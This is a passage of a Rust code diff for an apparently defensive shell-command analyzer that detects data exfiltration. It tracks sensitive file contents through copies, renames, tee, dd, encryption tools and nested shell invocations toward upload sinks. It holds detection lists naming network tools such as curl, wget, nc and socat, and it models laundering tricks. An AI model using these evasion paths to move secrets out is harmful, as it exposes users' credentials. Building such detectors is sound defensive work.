+        staged.paths.remove(&key);
+        staged.uncertain_paths.remove(&key);
+    }
+    match flow {
+        FlowProof::Sensitive => {
+            if staged.paths.len() >= MAX_STAGED_DATAFLOW_PATHS && !staged.paths.contains_key(&key) {
+                staged.exhausted = true;
+            } else {
+                staged.paths.insert(key, operation);
+            }
+        }
+        FlowProof::Incomplete => {
+            if staged.uncertain_paths.len() >= MAX_STAGED_DATAFLOW_PATHS
+                && !staged.uncertain_paths.contains(&key)
+            {
+                staged.exhausted = true;
+            } else {
+                staged.uncertain_paths.insert(key);
+            }
+        }
+        FlowProof::Clean => {}
+    }
+}
+
+fn literal_arguments(args: &[String], shell: ShellType) -> Result<Vec<String>, ()> {
+    args.iter()
+        .map(|argument| evaluated_literal(argument, shell))
+        .collect()
+}
+
+#[derive(Default)]
+struct TransferOperands<'a> {
+    positionals: Vec<&'a str>,
+    no_target_directory: bool,
+    parents: bool,
+    exchange: bool,
+}
+
+fn transfer_positionals<'a>(
+    command: &str,
+    values: &'a [String],
+) -> Result<TransferOperands<'a>, ()> {
+    let mut positionals = Vec::new();
+    let mut no_target_directory = false;
+    let mut parents = false;
+    let mut exchange = false;
+    let mut index = 0usize;
+    let mut options = true;
+    while index < values.len() {
+        let value = values[index].as_str();
+        if options && value == "--" {
+            options = false;
+            index += 1;
+            continue;
+        }
+        if !options || !value.starts_with('-') || value == "-" {
+            positionals.push(value);
+            index += 1;
+            continue;
+        }
+
+        if let Some(long) = value.strip_prefix("--") {
+            let (name, attached) = long
+                .split_once('=')
+                .map_or((long, None), |(name, value)| (name, Some(value)));
+            let no_value = match command {
+                "cp" => matches!(
+                    name,
+                    "archive"
+                        | "attributes-only"
+                        | "copy-contents"
+                        | "dereference"
+                        | "force"
+                        | "interactive"
+                        | "link"
+                        | "no-clobber"
+                        | "no-dereference"
+                        | "no-target-directory"
+                        | "one-file-system"
+                        | "parents"
+                        | "recursive"
+                        | "remove-destination"
+                        | "strip-trailing-slashes"
+                        | "symbolic-link"
+                        | "update"
+                        | "verbose"
+                ),
+                "mv" => matches!(
+                    name,
+                    "exchange"
+                        | "force"
+                        | "interactive"
+                        | "no-clobber"
+                        | "no-copy"
+                        | "no-target-directory"
+                        | "update"
+                        | "verbose"
+                ),
+                "install" => matches!(
+                    name,
+                    "compare"
+                        | "create-leading"
+                        | "no-target-directory"
+                        | "preserve-timestamps"
+                        | "strip"
+                        | "verbose"
+                ),
+                "ln" => matches!(
+                    name,
+                    "backup"
+                        | "directory"
+                        | "force"
+                        | "interactive"
+                        | "logical"
+                        | "no-dereference"
+                        | "no-target-directory"
+                        | "physical"
+                        | "relative"
+                        | "symbolic"
+                        | "verbose"
+                ),
+                _ => false,
+            };
+            if no_value {
+                if attached.is_some() {
+                    return Err(());
+                }
+                no_target_directory |= name == "no-target-directory";
+                parents |= command == "cp" && name == "parents";
+                exchange |= command == "mv" && name == "exchange";
+                index += 1;
+                continue;
+            }
+            let optional_attached_value = match command {
+                "cp" => matches!(
+                    name,
+                    "backup" | "preserve" | "no-preserve" | "reflink" | "sparse"
+                ),
+                "mv" | "ln" => matches!(name, "backup"),
+                _ => false,
+            };
+            if optional_attached_value {
+                index += 1;
+                continue;
+            }
+            let required_value = match command {
+                "cp" | "mv" | "ln" => matches!(name, "suffix"),
+                "install" => matches!(
+                    name,
+                    "group" | "mode" | "owner" | "strip-program" | "suffix"
+                ),
+                _ => false,
+            };
+            if required_value {
+                if attached.is_none() {
+                    index += 1;
+                    if index >= values.len() {
+                        return Err(());
+                    }
+                }
+                index += 1;
+                continue;
+            }
+            // Target-directory and directory-creation forms change the output
+            // identity; unsupported options remain deliberately unproven.
+            return Err(());
+        }
+
+        let flags = value.trim_start_matches('-');
+        if flags.is_empty() {
+            positionals.push(value);
+            index += 1;
+            continue;
+        }
+        match command {
+            "cp" if flags
+                .chars()
+                .all(|flag| "abdfHiLlnpPrRsvTux".contains(flag)) =>
+            {
+                no_target_directory |= flags.contains('T');
+                index += 1;
+            }
+            "mv" if flags.chars().all(|flag| "bfinTuv".contains(flag)) => {
+                no_target_directory |= flags.contains('T');
+                index += 1;
+            }
+            "ln" if flags.chars().all(|flag| "bdfinPrsTtv".contains(flag)) => {
+                no_target_directory |= flags.contains('T');
+                index += 1;
+            }
+            "install" => {
+                no_target_directory |= flags.contains('T');
+                for (offset, flag) in flags.char_indices() {
+                    if "CDpsTv".contains(flag) {
+                        continue;
+                    }
+                    if "gmoS".contains(flag) {
+                        let value_starts = offset + flag.len_utf8();
+                        if value_starts == flags.len() {
+                            index += 1;
+                            if index >= values.len() {
+                                return Err(());
+                            }
+                        }
+                        // The remainder is the attached option value, not flags.
+                        break;
+                    }
+                    return Err(());
+                }
+                index += 1;
+            }
+            _ => return Err(()),
+        }
+    }
+    Ok(TransferOperands {
+        positionals,
+        no_target_directory,
+        parents,
+        exchange,
+    })
+}
+
+fn transfer_basename(path: &str, shell: ShellType) -> Option<&str> {
+    let path = path.trim_end_matches(|character| {
+        character == '/' || (shell == ShellType::Cmd && character == '\\')
+    });
+    path.rsplit(|character| character == '/' || (shell == ShellType::Cmd && character == '\\'))
+        .find(|component| !component.is_empty())
+}
+
+fn join_transfer_path(directory: &str, child: &str, shell: ShellType) -> Option<String> {
+    if directory.is_empty() || child.is_empty() {
+        return None;
+    }
+    let separator = if shell == ShellType::Cmd && directory.contains('\\') {
+        '\\'
+    } else {
+        '/'
+    };
+    Some(format!(
+        "{}{}{}",
+        directory.trim_end_matches(['/', '\\']),
+        separator,
+        child.trim_start_matches(['/', '\\'])
+    ))
+}
+
+fn record_transfer_destination(
+    staged: &mut StagedDataflow,
+    destination: &str,
+    shell: ShellType,
+    source_flow: FlowProof,
+    operation: DataFlowOperation,
+    certain: bool,
+) {
+    record_staged_output(
+        staged,
+        destination,
+        shell,
+        false,
+        if certain {
+            source_flow
+        } else if source_flow == FlowProof::Clean {
+            FlowProof::Clean
+        } else {
+            FlowProof::Incomplete
+        },
+        operation,
+    );
+}
+
+/// Track file outputs expressed as command operands rather than shell
+/// redirections. Otherwise a sensitive stream can be laundered through an
+/// innocuous temporary filename before a later upload.
+fn update_operand_output_lineage(
+    staged: &mut StagedDataflow,
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+    produced_flow: FlowProof,
+) {
+    let Ok(values) = literal_arguments(args, shell) else {
+        if produced_flow != FlowProof::Clean {
+            staged.exhausted = true;
+        }
+        return;
+    };
+    match command {
+        "tee" => {
+            let append = values
+                .iter()
+                .take_while(|value| value.as_str() != "--")
+                .any(|value| {
+                    value == "--append"
+                        || value
+                            .strip_prefix('-')
+                            .filter(|flags| !flags.starts_with('-'))
+                            .is_some_and(|flags| flags.contains('a'))
+                });
+            let mut options_terminated = false;
+            for value in &values {
+                if !options_terminated && value == "--" {
+                    options_terminated = true;
+                    continue;
+                }
+                if !options_terminated && value.starts_with('-') && value != "-" {
+                    continue;
+                }
+                record_staged_output(
+                    staged,
+                    value,
+                    shell,
+                    append,
+                    produced_flow,
+                    DataFlowOperation::TemporaryFile,
+                );
+            }
+        }
+        "dd" => {
+            let preserves_existing = values.iter().any(|value| {
+                value
+                    .strip_prefix("oflag=")
+                    .is_some_and(|flags| flags.split(',').any(|flag| flag == "append"))
+                    || value
+                        .strip_prefix("conv=")
+                        .is_some_and(|flags| flags.split(',').any(|flag| flag == "notrunc"))
+            });
+            let input_flow = values.iter().fold(FlowProof::Clean, |flow, value| {
+                let Some(path) = value.strip_prefix("if=").filter(|path| !path.is_empty()) else {
+                    return flow;
+                };
+                let current = if sensitive_operand(path) {
+                    FlowProof::Sensitive
+                } else {
+                    staged_flow_for_path(staged, path, shell)
+                };
+                merge_flow_proof(flow, current)
+            });
+            let output_flow = merge_flow_proof(produced_flow, input_flow);
+            for value in &values {
+                if let Some(path) = value.strip_prefix("of=").filter(|path| !path.is_empty()) {
+                    record_staged_output(
+                        staged,
+                        path,
+                        shell,
+                        preserves_existing,
+                        output_flow,
+                        DataFlowOperation::TemporaryFile,
+                    );
+                }
+            }
+        }
+        "openssl" | "gpg" | "gpg2" | "age" => {
+            let mut index = 0usize;
+            while index < values.len() {
+                if matches!(values[index].as_str(), "-out" | "-o" | "--output") {
+                    if let Some(path) = values.get(index + 1) {
+                        record_staged_output(
+                            staged,
+                            path,
+                            shell,
+                            false,
+                            produced_flow,
+                            staged_operation(command),
+                        );
+                    } else if produced_flow != FlowProof::Clean {
+                        staged.exhausted = true;
+                    }
+                    index += 2;
+                    continue;
+                }
+                if let Some(path) = values[index]
+                    .strip_prefix("--output=")
+                    .filter(|path| !path.is_empty())
+                {
+                    record_staged_output(
+                        staged,
+                        path,
+                        shell,
+                        false,
+                        produced_flow,
+                        staged_operation(command),
+                    );
+                }
+                index += 1;
+            }
+        }
+        "cp" | "mv" | "install" | "ln" => {
+            // Support the unambiguous two-operand form. Complex target-directory
+            // layouts remain unproven rather than guessing a destination.
+            let Ok(positionals) = transfer_positionals(command, &values) else {
+                if staged_argument_relevance(staged, args, shell) != FlowProof::Clean {
+                    staged.exhausted = true;
+                }
+                return;
+            };
+            if positionals.positionals.len() == 2 {
+                let source = positionals.positionals[0];
+                let destination = positionals.positionals[1];
+                let source_flow = if sensitive_operand(source) {
+                    FlowProof::Sensitive
+                } else {
+                    staged_flow_for_path(staged, source, shell)
+                };
+                if command == "mv" && positionals.exchange {
+                    let destination_flow = if sensitive_operand(destination) {
+                        FlowProof::Sensitive
+                    } else {
+                        staged_flow_for_path(staged, destination, shell)
+                    };
+                    record_transfer_destination(
+                        staged,
+                        source,
+                        shell,
+                        destination_flow,
+                        DataFlowOperation::TemporaryFile,
+                        true,
+                    );
+                    record_transfer_destination(
+                        staged,
+                        destination,
+                        shell,
+                        source_flow,
+                        DataFlowOperation::TemporaryFile,
+                        true,
+                    );
+                    return;
+                }
+
+                let trailing_directory = destination.ends_with('/')
+                    || (shell == ShellType::Cmd && destination.ends_with('\\'));
+                let exact_destination = positionals.no_target_directory;
+                let output = if positionals.parents {
+                    join_transfer_path(destination, source, shell)
+                } else if trailing_directory {
+                    transfer_basename(source, shell)
+                        .and_then(|basename| join_transfer_path(destination, basename, shell))
+                } else {
+                    Some(destination.to_string())
+                };
+                if let Some(output) = output {
+                    record_transfer_destination(
+                        staged,
+                        &output,
+                        shell,
+                        source_flow,
+                        DataFlowOperation::TemporaryFile,
+                        true,
+                    );
+                } else if source_flow != FlowProof::Clean {
+                    staged.exhausted = true;
+                }
+
+                // Without -T, an existing destination directory changes the
+                // effective output identity even when it lacks a trailing slash.
+                // Preserve that alternate as typed uncertainty rather than
+                // declaring the basename child clean.
+                if !exact_destination && !trailing_directory && !positionals.parents {
+                    if let Some(directory_output) = transfer_basename(source, shell)
+                        .and_then(|basename| join_transfer_path(destination, basename, shell))
+                    {
+                        record_transfer_destination(
+                            staged,
+                            &directory_output,
+                            shell,
+                            source_flow,
+                            DataFlowOperation::TemporaryFile,
+                            false,
+                        );
+                    } else if source_flow != FlowProof::Clean {
+                        staged.exhausted = true;
+                    }
+                }
+                if command == "mv" {
+                    if let Ok(source_key) = staged_path_key(source, shell) {
+                        staged.paths.remove(&source_key);
+                        staged.uncertain_paths.remove(&source_key);
+                    }
+                }
+            } else if positionals.positionals.iter().any(|source| {
+                sensitive_operand(source)
+                    || staged_flow_for_path(staged, source, shell) != FlowProof::Clean
+            }) {
+                staged.exhausted = true;
+            }
+        }
+        _ => {}
+    }
+}
+
 fn update_staged_lineage(
     staged: &mut StagedDataflow,
     segment: &tokenize::Segment,
@@ -8735,14 +9808,6 @@ fn update_staged_lineage(
     shell: ShellType,
     produced_flow: FlowProof,
 ) {
-    if matches!(
-        segment.preceding_separator.as_deref(),
-        Some("||") | Some("&") | Some("-or")
-    ) {
-        staged.paths.clear();
-        staged.uncertain_paths.clear();
-        return;
-    }
     if matches!(
         command,
         "rm" | "unlink" | "del" | "erase" | "remove-item" | "ri"
@@ -8755,6 +9820,7 @@ fn update_staged_lineage(
         }
         return;
     }
+    update_operand_output_lineage(staged, command, &segment.args, shell, produced_flow);
     let Some((raw_path, append)) = segment_stdout_target(segment, shell) else {
         if let Some(path) = archive_file_output(command, &segment.args, shell) {
             let archive_flow = archive_file_provenance(command, &segment.args, shell);
@@ -8789,35 +9855,14 @@ fn update_staged_lineage(
         }
         return;
     };
-    let Ok(key) = staged_path_key(&raw_path, shell) else {
-        if produced_flow != FlowProof::Clean {
-            staged.exhausted = true;
-        }
-        return;
-    };
-    if !append {
-        staged.paths.remove(&key);
-        staged.uncertain_paths.remove(&key);
-    }
-    match produced_flow {
-        FlowProof::Sensitive => {
-            if staged.paths.len() >= MAX_STAGED_DATAFLOW_PATHS && !staged.paths.contains_key(&key) {
-                staged.exhausted = true;
-            } else {
-                staged.paths.insert(key, staged_operation(command));
-            }
-        }
-        FlowProof::Incomplete => {
-            if staged.uncertain_paths.len() >= MAX_STAGED_DATAFLOW_PATHS
-                && !staged.uncertain_paths.contains(&key)
-            {
-                staged.exhausted = true;
-            } else {
-                staged.uncertain_paths.insert(key);
-            }
-        }
-        FlowProof::Clean => {}
-    }
+    record_staged_output(
+        staged,
+        &raw_path,
+        shell,
+        append,
+        produced_flow,
+        staged_operation(command),
+    );
 }
 
 #[derive(Debug)]
@@ -8850,42 +9895,163 @@ fn analyze_upload_value(
     }
 }
 
+fn nested_output_preserving_command(command: &str) -> bool {
+    matches!(command, "echo" | "printf" | "write-output" | "out-string")
+}
+
+fn nested_argument_is_known_non_output(command: &str) -> bool {
+    matches!(
+        command,
+        "test"
+            | "["
+            | "[["
+            | "write-host"
+            | "curl"
+            | "wget"
+            | "http"
+            | "https"
+            | "xh"
+            | "nc"
+            | "ncat"
+            | "netcat"
+            | "socat"
+            | "scp"
+            | "rsync"
+            | "rclone"
+            | "dig"
+            | "nslookup"
+    )
+}
+
+fn is_nested_wrapper_command(command: &str) -> bool {
+    matches!(
+        command,
+        "sh" | "bash"
+            | "zsh"
+            | "dash"
+            | "ksh"
+            | "fish"
+            | "pwsh"
+            | "powershell"
+            | "powershell.exe"
+            | "cmd"
+            | "cmd.exe"
+            | "eval"
+            | "invoke-expression"
+            | "iex"
+    )
+}
+
 fn check_data_exfiltration(
     segments: &[tokenize::Segment],
     shell: ShellType,
     findings: &mut Vec<Finding>,
-) {
-    let mut pipe_flow = FlowProof::Clean;
+) -> FlowSummary {
+    let mut staged = StagedDataflow::default();
+    check_data_exfiltration_depth(segments, shell, findings, FlowProof::Clean, &mut staged, 0)
+}
+
+fn check_data_exfiltration_depth(
+    segments: &[tokenize::Segment],
+    shell: ShellType,
+    findings: &mut Vec<Finding>,
+    initial_stdin: FlowProof,
+    staged: &mut StagedDataflow,
+    depth: usize,
+) -> FlowSummary {
+    let mut pipe_flow = initial_stdin;
     // True when the previous segment statically printed a sensitive path
     // list, which an `xargs` consumer promotes from stdin data into a file
     // read operand. Tracked separately from `pipe_flow` because the path list
-    // itself is not sensitive CONTENT and must stay Clean as data.
+    // itself is not sensitive CONTENT and must stay Clean as data. Each nested
+    // executable body owns an independent pipeline state.
     let mut pipe_sensitive_path_list = false;
-    let mut staged = StagedDataflow::default();
+    let mut summary = FlowSummary::clean(initial_stdin);
+    let mut completed_stdout = FlowProof::Clean;
+    let mut completed_stderr = FlowProof::Clean;
+    let mut pipeline_stdout = FlowProof::Clean;
+    let mut pipeline_stderr = FlowProof::Clean;
+    let mut previous_entry: Option<StagedDataflow> = None;
+    let mut previous_outcome = StaticCommandOutcome::Unknown;
     for (segment_index, seg) in segments.iter().enumerate() {
-        if matches!(
-            seg.preceding_separator.as_deref(),
-            Some("||") | Some("&") | Some("-or")
-        ) {
-            staged.paths.clear();
-            staged.uncertain_paths.clear();
+        let separator = seg.preceding_separator.as_deref();
+        let statically_skipped = matches!(
+            (separator, previous_outcome),
+            (Some("||") | Some("-or"), StaticCommandOutcome::Success)
+                | (Some("&&") | Some("-and"), StaticCommandOutcome::Failure)
+        );
+        if statically_skipped {
+            // `true || rhs` and `false && rhs` leave both staged state and
+            // list outcome unchanged. The following segment may continue the
+            // same AND/OR list, so retain the known outcome as well.
+            continue;
         }
+        let post_previous = staged.clone();
+        let mut conditional_alternate = None;
+        match (separator, previous_outcome) {
+            (Some("||") | Some("-or"), StaticCommandOutcome::Unknown) => {
+                conditional_alternate = Some(post_previous);
+                if let Some(entry) = &previous_entry {
+                    *staged = unknown_failure_staged_entry(
+                        entry,
+                        conditional_alternate
+                            .as_ref()
+                            .expect("post-state was captured above"),
+                    );
+                } else {
+                    degrade_staged_dataflow_to_uncertain(staged);
+                }
+            }
+            (Some("&&") | Some("-and"), StaticCommandOutcome::Unknown) => {
+                conditional_alternate = previous_entry.clone();
+            }
+            (Some("&"), _) => degrade_staged_dataflow_to_uncertain(staged),
+            _ => {}
+        }
+        let current_entry = staged.clone();
         let mut staged_curl_wget_finding = None;
+        let mut staged_curl_wget_incomplete = false;
         let pipe_connected = segment_index > 0
             && matches!(seg.preceding_separator.as_deref(), Some("|") | Some("|&"));
         let incoming_flow = if pipe_connected {
             pipe_flow
+        } else if segment_index == 0 {
+            initial_stdin
         } else {
             FlowProof::Clean
         };
+        let outgoing_separator = segments
+            .get(segment_index + 1)
+            .and_then(|next| next.preceding_separator.as_deref());
+        let routing = ordered_fd_routing(seg, shell, incoming_flow, outgoing_separator);
+        summary.redirection_complete &= routing.complete;
         // A POSIX assignment-only simple command can still truncate or append
         // to a file through redirection. It has no executable command, so the
         // effective-command resolver correctly rejects it; update staged file
         // provenance before entering that resolver rather than letting the
         // error path retain stale sensitive bytes.
         if seg.command.is_none() {
-            update_staged_lineage(&mut staged, seg, "", shell, FlowProof::Clean);
-            pipe_flow = FlowProof::Clean;
+            update_staged_lineage(staged, seg, "", shell, FlowProof::Clean);
+            summary.pipe_complete = false;
+            let (parent_stdout, parent_stderr) =
+                route_flow(FlowProof::Incomplete, FlowProof::Incomplete, routing);
+            pipe_flow = accumulate_segment_output(
+                segment_index,
+                pipe_connected,
+                seg.preceding_separator.as_deref(),
+                outgoing_separator,
+                parent_stdout,
+                parent_stderr,
+                &mut completed_stdout,
+                &mut completed_stderr,
+                &mut pipeline_stdout,
+                &mut pipeline_stderr,
+            );
+            if let Some(alternate) = conditional_alternate.take() {
+                merge_staged_dataflow(staged, alternate);
+            }
+            previous_entry = Some(current_entry);
+            previous_outcome = StaticCommandOutcome::Unknown;
             pipe_sensitive_path_list = false;
             continue;
         }
@@ -8898,14 +10064,52 @@ fn check_data_exfiltration(
                 {
                     findings.push(unresolved_sensitive_upload_finding());
                 }
-                pipe_flow = FlowProof::Clean;
+                summary.pipe_complete = false;
+                let (parent_stdout, parent_stderr) =
+                    route_flow(FlowProof::Incomplete, FlowProof::Incomplete, routing);
+                pipe_flow = accumulate_segment_output(
+                    segment_index,
+                    pipe_connected,
+                    seg.preceding_separator.as_deref(),
+                    outgoing_separator,
+                    parent_stdout,
+                    parent_stderr,
+                    &mut completed_stdout,
+                    &mut completed_stderr,
+                    &mut pipeline_stdout,
+                    &mut pipeline_stderr,
+                );
+                if let Some(alternate) = conditional_alternate.take() {
+                    merge_staged_dataflow(staged, alternate);
+                }
+                previous_entry = Some(current_entry);
+                previous_outcome = StaticCommandOutcome::Unknown;
                 pipe_sensitive_path_list = false;
                 continue;
             }
         };
         let Some(ref cmd) = effective.command else {
-            update_staged_lineage(&mut staged, seg, "", shell, FlowProof::Clean);
-            pipe_flow = FlowProof::Clean;
+            update_staged_lineage(staged, seg, "", shell, FlowProof::Clean);
+            summary.pipe_complete = false;
+            let (parent_stdout, parent_stderr) =
+                route_flow(FlowProof::Incomplete, FlowProof::Incomplete, routing);
+            pipe_flow = accumulate_segment_output(
+                segment_index,
+                pipe_connected,
+                seg.preceding_separator.as_deref(),
+                outgoing_separator,
+                parent_stdout,
+                parent_stderr,
+                &mut completed_stdout,
+                &mut completed_stderr,
+                &mut pipeline_stdout,
+                &mut pipeline_stderr,
+            );
+            if let Some(alternate) = conditional_alternate.take() {
+                merge_staged_dataflow(staged, alternate);
+            }
+            previous_entry = Some(current_entry);
+            previous_outcome = StaticCommandOutcome::Unknown;
             pipe_sensitive_path_list = false;
             continue;
         };
@@ -8918,14 +10122,26 @@ fn check_data_exfiltration(
                 if sensitive_candidate && matches!(cmd_base.as_str(), "curl" | "wget") {
                     findings.push(unresolved_sensitive_upload_finding());
                 }
-                pipe_flow = if sensitive_candidate
-                    && (is_dataflow_reader(&cmd_base)
-                        || crate::env_guard::is_data_preserving_transform(&cmd_base))
-                {
-                    FlowProof::Incomplete
-                } else {
-                    FlowProof::Clean
-                };
+                summary.pipe_complete = false;
+                let (parent_stdout, parent_stderr) =
+                    route_flow(FlowProof::Incomplete, FlowProof::Incomplete, routing);
+                pipe_flow = accumulate_segment_output(
+                    segment_index,
+                    pipe_connected,
+                    seg.preceding_separator.as_deref(),
+                    outgoing_separator,
+                    parent_stdout,
+                    parent_stderr,
+                    &mut completed_stdout,
+                    &mut completed_stderr,
+                    &mut pipeline_stdout,
+                    &mut pipeline_stderr,
+                );
+                if let Some(alternate) = conditional_alternate.take() {
+                    merge_staged_dataflow(staged, alternate);
+                }
+                previous_entry = Some(current_entry);
+                previous_outcome = StaticCommandOutcome::Unknown;
                 pipe_sensitive_path_list = false;
                 continue;
             }
@@ -8933,8 +10149,93 @@ fn check_data_exfiltration(
         effective.args = effective_args;
         let emits_sensitive_path_list = matches!(shell, ShellType::Posix | ShellType::Fish)
             && static_sensitive_path_list_output(&cmd_base, &effective.args);
-        let sensitive_stdin_redirection = has_sensitive_stdin_redirection(seg);
-        let mut current_read = if sensitive_stdin_redirection
+        let (occurrences, nested_gap) =
+            crate::extract::executable_body_occurrences(seg, shell, outgoing_separator);
+        let mut replacement_stdout = FlowProof::Clean;
+        let mut replacement_stderr = FlowProof::Clean;
+        let mut argument_flows = BTreeMap::<usize, FlowProof>::new();
+        let mut has_replacement = false;
+        let mut nested_complete = nested_gap.is_none();
+        if depth >= 8 && !occurrences.is_empty() {
+            argument_flows.insert(usize::MAX, FlowProof::Incomplete);
+            nested_complete = false;
+        } else {
+            for occurrence in occurrences {
+                use crate::extract::ExecutableRelation;
+                let child_segments =
+                    tokenize::tokenize(&occurrence.body.input, occurrence.body.shell);
+                let mut isolated_staged;
+                let child_staged = if matches!(
+                    occurrence.relation,
+                    ExecutableRelation::Concurrent | ExecutableRelation::Unknown
+                ) {
+                    isolated_staged = staged.clone();
+                    &mut isolated_staged
+                } else {
+                    &mut *staged
+                };
+                let child = check_data_exfiltration_depth(
+                    &child_segments,
+                    occurrence.body.shell,
+                    findings,
+                    routing.stdin,
+                    child_staged,
+                    depth + 1,
+                );
+                let child_stdout: FlowProof = child.stdout.into();
+                let child_stderr: FlowProof = child.stderr.into();
+                debug_assert_eq!(child.stdin, FlowValue::from(routing.stdin));
+                nested_complete &= child.redirection_complete && child.pipe_complete;
+                match occurrence.relation {
+                    ExecutableRelation::WrapperReplacement => {
+                        has_replacement = true;
+                        replacement_stdout = merge_flow_proof(replacement_stdout, child_stdout);
+                        replacement_stderr = merge_flow_proof(replacement_stderr, child_stderr);
+                    }
+                    ExecutableRelation::ArgumentValue { index } => {
+                        argument_flows
+                            .entry(index)
+                            .and_modify(|flow| *flow = merge_flow_proof(*flow, child_stdout))
+                            .or_insert(child_stdout);
+                    }
+                    ExecutableRelation::Concurrent | ExecutableRelation::Unknown => {
+                        nested_complete = false;
+                        if child_stdout != FlowProof::Clean || child_stderr != FlowProof::Clean {
+                            argument_flows.insert(usize::MAX, FlowProof::Incomplete);
+                        }
+                    }
+                }
+                let _occurrence_span = occurrence.parent_range;
+            }
+        }
+        if !nested_complete {
+            // Keep uncertainty in the flow graph. It is converted into an
+            // AnalysisIncomplete finding only if a proven remote sink consumes
+            // the affected value later in this traversal.
+            argument_flows
+                .entry(usize::MAX)
+                .and_modify(|flow| *flow = merge_flow_proof(*flow, FlowProof::Incomplete))
+                .or_insert(FlowProof::Incomplete);
+            if is_nested_wrapper_command(&cmd_base) {
+                has_replacement = true;
+                if replacement_stdout == FlowProof::Clean {
+                    replacement_stdout = FlowProof::Incomplete;
+                }
+                if replacement_stderr == FlowProof::Clean {
+                    replacement_stderr = FlowProof::Incomplete;
+                }
+            }
+        }
+        summary.redirection_complete &= nested_complete;
+        summary.pipe_complete &= nested_complete;
+        let argument_stdout = argument_flows
+            .values()
+            .copied()
+            .fold(FlowProof::Clean, merge_flow_proof);
+        let sensitive_stdin_redirection = routing.stdin == FlowProof::Sensitive;
+        let mut current_read = if has_replacement {
+            replacement_stdout
+        } else if sensitive_stdin_redirection
             && (is_shell_dataflow_reader(&cmd_base, shell)
                 || crate::env_guard::is_data_preserving_transform(&cmd_base))
         {
@@ -8951,43 +10252,72 @@ fn check_data_exfiltration(
                 pipe_sensitive_path_list,
             );
         }
+        if !argument_flows.is_empty() && nested_output_preserving_command(&cmd_base) {
+            current_read = merge_flow_proof(current_read, argument_stdout);
+        } else if !argument_flows.is_empty()
+            && !nested_argument_is_known_non_output(&cmd_base)
+            && argument_stdout != FlowProof::Clean
+            && current_read == FlowProof::Clean
+        {
+            // An unknown consumer may discard or reproduce a substitution.
+            // Preserve uncertainty, but do not claim confirmed exfiltration.
+            current_read = FlowProof::Incomplete;
+        }
         if current_read == FlowProof::Clean && is_shell_dataflow_reader(&cmd_base, shell) {
             for raw in &effective.args {
                 current_read =
-                    merge_flow_proof(current_read, staged_flow_for_path(&staged, raw, shell));
+                    merge_flow_proof(current_read, staged_flow_for_path(staged, raw, shell));
             }
         }
-        let (direct, stdin_remote, stdin_incomplete) = match cmd_base.as_str() {
-            "curl" | "wget" => {
-                let analysis = analyze_upload_client(&effective, shell, &cmd_base);
-                for (path, operation) in &analysis.remote_upload_paths {
-                    match staged_flow_for_path(&staged, path, shell) {
-                        FlowProof::Sensitive => {
-                            staged_curl_wget_finding = Some((
-                                if cmd_base == "wget" {
-                                    DataFlowSink::Wget
-                                } else {
-                                    DataFlowSink::Curl
-                                },
-                                *operation,
-                            ));
-                            break;
+        let (direct, stdin_remote, stdin_incomplete, argument_remote, upload_indices) =
+            match cmd_base.as_str() {
+                "curl" | "wget" => {
+                    let analysis = analyze_upload_client(&effective, shell, &cmd_base);
+                    for (path, operation) in &analysis.remote_upload_paths {
+                        match staged_flow_for_path(staged, path, shell) {
+                            FlowProof::Sensitive => {
+                                staged_curl_wget_finding = Some((
+                                    if cmd_base == "wget" {
+                                        DataFlowSink::Wget
+                                    } else {
+                                        DataFlowSink::Curl
+                                    },
+                                    *operation,
+                                ));
+                                break;
+                            }
+                            FlowProof::Incomplete => {
+                                findings.push(unresolved_sensitive_upload_finding());
+                                staged_curl_wget_incomplete = true;
+                                break;
+                            }
+                            FlowProof::Clean => {}
                         }
-                        FlowProof::Incomplete => {
-                            findings.push(unresolved_sensitive_upload_finding());
-                            break;
-                        }
-                        FlowProof::Clean => {}
                     }
+                    if staged_curl_wget_finding.is_none()
+                        && !staged_curl_wget_incomplete
+                        && staged.exhausted
+                        && !analysis.remote_upload_paths.is_empty()
+                    {
+                        findings.push(unresolved_sensitive_upload_finding());
+                    }
+                    (
+                        analysis.direct,
+                        analysis.stdin_remote,
+                        analysis.stdin_incomplete,
+                        analysis.remote_destination,
+                        analysis.wire_argument_indices,
+                    )
                 }
-                (
-                    analysis.direct,
-                    analysis.stdin_remote,
-                    analysis.stdin_incomplete,
-                )
-            }
-            _ => (DirectUploadAnalysis::None, false, false),
-        };
+                _ => (
+                    DirectUploadAnalysis::None,
+                    false,
+                    false,
+                    false,
+                    BTreeSet::new(),
+                ),
+            };
+        let direct_upload_incomplete = matches!(direct, DirectUploadAnalysis::Incomplete);
         let found_direct_upload = match direct {
             DirectUploadAnalysis::Sensitive(source, operation) => {
                 findings.push(data_exfiltration_finding(
@@ -9001,10 +10331,7 @@ fn check_data_exfiltration(
                 ));
                 true
             }
-            DirectUploadAnalysis::Incomplete => {
-                findings.push(unresolved_sensitive_upload_finding());
-                true
-            }
+            DirectUploadAnalysis::Incomplete => false,
             DirectUploadAnalysis::None => false,
         };
         if let Some((sink, operation)) = staged_curl_wget_finding {
@@ -9014,16 +10341,17 @@ fn check_data_exfiltration(
                 DataFlowSource::SensitiveFile,
             ));
         }
-        let upload_input_flow = if sensitive_stdin_redirection {
-            merge_flow_proof(incoming_flow, FlowProof::Sensitive)
-        } else {
-            incoming_flow
-        };
+        let upload_input_flow = routing.stdin;
         if !found_direct_upload && upload_input_flow != FlowProof::Clean {
             if stdin_incomplete || (stdin_remote && upload_input_flow == FlowProof::Incomplete) {
                 findings.push(unresolved_sensitive_upload_finding());
                 pipe_flow = FlowProof::Clean;
                 pipe_sensitive_path_list = false;
+                if let Some(alternate) = conditional_alternate.take() {
+                    merge_staged_dataflow(staged, alternate);
+                }
+                previous_entry = Some(current_entry);
+                previous_outcome = StaticCommandOutcome::Unknown;
                 continue;
             }
             if stdin_remote {
@@ -9066,6 +10394,57 @@ fn check_data_exfiltration(
             }
             _ => ExtendedSinkProof::None,
         };
+        let extended_has_direct_source = matches!(
+            &extended_sink,
+            ExtendedSinkProof::Remote {
+                direct_source: Some(_),
+                ..
+            }
+        );
+        let argument_flow = security_relevant_argument_flow(
+            &cmd_base,
+            &effective.args,
+            shell,
+            &argument_flows,
+            &upload_indices,
+        );
+        let argument_sink =
+            if argument_remote || matches!(&extended_sink, ExtendedSinkProof::Remote { .. }) {
+                match cmd_base.as_str() {
+                    "curl" => Some((DataFlowSink::Curl, DataFlowOperation::RequestBody)),
+                    "wget" => Some((DataFlowSink::Wget, DataFlowOperation::PostData)),
+                    "http" | "https" | "xh" | "invoke-webrequest" | "iwr" | "invoke-restmethod"
